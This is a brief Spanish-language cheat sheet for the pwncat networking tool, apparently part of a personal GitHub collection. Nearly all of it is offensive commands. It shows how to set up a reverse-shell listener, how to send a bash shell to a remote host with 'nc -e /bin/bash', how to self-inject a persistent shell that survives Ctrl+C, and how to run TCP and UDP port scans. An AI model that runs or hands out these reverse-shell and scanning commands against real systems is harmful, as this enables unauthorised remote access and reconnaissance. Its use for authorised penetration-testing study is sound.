# Pwncat Cheat Sheet

#### Reverse Shell (Linux)

- `pwncat -l <Lisitening-Port> -vv`: Escuchando la conexión.

- `nc -e /bin/bash <Host> <Port>`: Conexión al host y mandamos la shell.

- `pwncat -l <Lisitening-Port> --self-inject /bin/bash:<Host>:<Port>`: Conexión al host y no perder el shell con CTRL + C.

- `pwncat -l <Lisitening-Port> -vv`: Recuperar la sesión si con el anterior comando se salió con CTRL + C.

#### Escanear Puertos TCP

- `pwncat -z <Host> 1-1000`: Escanear la IP del host con el rango de puertos.

#### Escanear Puertos UDP

- `pwncat -z <Host> 1-1000 -u`: Escanear la IP del host con el rango de puertos.

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)